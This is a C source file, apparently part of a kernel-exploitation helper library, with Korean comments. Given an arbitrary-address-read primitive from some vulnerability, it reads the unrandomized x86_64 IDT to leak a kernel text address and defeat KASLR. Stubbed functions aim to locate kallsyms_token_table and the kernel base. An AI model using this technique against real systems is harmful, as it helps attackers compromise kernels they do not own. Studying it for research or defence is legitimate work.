#include <unistd.h>

#include <uallsyms/uallsyms.h>
#include <uallsyms/types.h>

/*
 * https://elixir.bootlin.com/linux/v6.8.1/source/include/uapi/linux/const.h#L20
 * #define __AC(X,Y)    (X##Y)
 * #define _AC(X,Y) __AC(X,Y)
 * #define _AT(T,X) ((T)(X))
 *
 * https://elixir.bootlin.com/linux/v6.8.1/source/arch/x86/include/asm/pgtable_64_types.h#L202
 * #define P4D_SHIFT        39
 * 
 * #define CPU_ENTRY_AREA_PGD   _AC(-4, UL)
 * #define CPU_ENTRY_AREA_BASE  (CPU_ENTRY_AREA_PGD << P4D_SHIFT)
 *
 * https://elixir.bootlin.com/linux/v6.8.1/source/arch/x86/include/asm/pgtable_areas.h#L9 
 * #define CPU_ENTRY_AREA_RO_IDT        CPU_ENTRY_AREA_BASE
 * #define CPU_ENTRY_AREA_PER_CPU       (CPU_ENTRY_AREA_RO_IDT + PAGE_SIZE)
 * 
 * #define CPU_ENTRY_AREA_RO_IDT_VADDR  ((void *)CPU_ENTRY_AREA_RO_IDT)
 * 
 * CPU_ENTRY_AREA_RO_IDT_VADDR => ((void *)(-4UL << 39)) = (void *)0xfffffe0000000000
 */
#define IDT_BASE ((kaddr_t)0xfffffe0000000000)
#define PAGE_SIZE ((uint64_t)sysconf(_SC_PAGE_SIZE))
#define PAGE_MASK (~(PAGE_SIZE - 1))

/*
 * struct idt_bits {
 *     u16 ist : 3,
 *         zero: 5,
 *         type: 5,
 *         dpl : 2,
 *         p   : 1;
 * } __attribute__((packed));
 * 
 * struct gate_struct {
 *     u16     offset_low;
 *     u16     segment;
 *     struct idt_bits bits;
 *     u16     offset_middle;
 * #ifdef CONFIG_X86_64
 *     u32     offset_high;
 *     u32     reserved;
 * #endif
 * } __attribute__((packed));
 */

struct partial_gate_struct {
    uint16_t offset_low;
    uint16_t segment;
    uint16_t bits;
    uint16_t offset_middle;
};

static kaddr_t x86_64_resolve_div_by_0_handler(uas_t *uas)
{
    struct partial_gate_struct partial_gate;
    kaddr_t div_by_0_handler;
    int ret;

    /* offset_high는 0xffffffff로 고정되어 있다. */
    uint32_t offset_high = 0xffffffff;

    /*
     * https://elixir.bootlin.com/linux/v6.8.1/source/arch/x86/kernel/idt.c#L84
     * 
     * IDT의 첫번째 entry는 division-by-zero handler이다.
     */
    ret = uas->aar_func(&partial_gate, IDT_BASE, sizeof(partial_gate));
    if (ret < 0)
        return UNKNOWN_KADDR;

    div_by_0_handler = ((uint64_t)offset_high << 32) | (partial_gate.offset_middle << 16) | (partial_gate.offset_low);
    
    return div_by_0_handler;
}

static kaddr_t x86_64_resolve_kallsyms_token_table(uas_t *uas)
{
    kaddr_t div_by_0_handler;
    DEFINE_KVER(min_supported_kver, 6, 6, 0);

    if (kver_gt(min_supported_kver, uas->kver))
        return UNKNOWN_KADDR;

    /* 
     * 먼저 AAR 취약점이 Invalid한 주소를 참조하면 에러를 반환할 수 있기 때문에, 
     * KASLR의 영향을 받지 않는 IDT Entry를 이용해 __entry_text_start + α의 주소를 가져온다.
     * 
     * 대략적인 Kernel Memory Map (KPTI가 enable 되었을 때, 하지만 disable 되어도 각 page의 global flag정도만 다르고 크게 다른게 없다.)
     * _text                [R-X KERN ACCESSED]
     * __entry_text_start   [R-X KERN ACCESSED GLOBAL]
     * __start_rodata       [R-- KERN ACCESSED]
     * __end_rodata         
     * HOLE
     * _sdata, init_stack   [RW- KERN ACCESSED DIRTY]
     * 
     * kallsyms_token_table이 있는 rodata 영역은 __entry_text_start 이후에 있기에 
     * kallsyms_token_table를 이후 메모리를 순회하며 찾는다.
     */
    div_by_0_handler = x86_64_resolve_div_by_0_handler(uas);
    if (div_by_0_handler == UNKNOWN_KADDR)
        return UNKNOWN_KADDR;

    return UNKNOWN_KADDR;
}

kaddr_t x86_64_resolve_kernel_base(uas_t *uas)
{
    if (uas->kallsyms_token_table == UNKNOWN_KADDR)
        uas->kallsyms_token_table = x86_64_resolve_kallsyms_token_table(uas);

    if (uas->kallsyms_token_table == UNKNOWN_KADDR)
        return UNKNOWN_KADDR;

    return UNKNOWN_KADDR;
}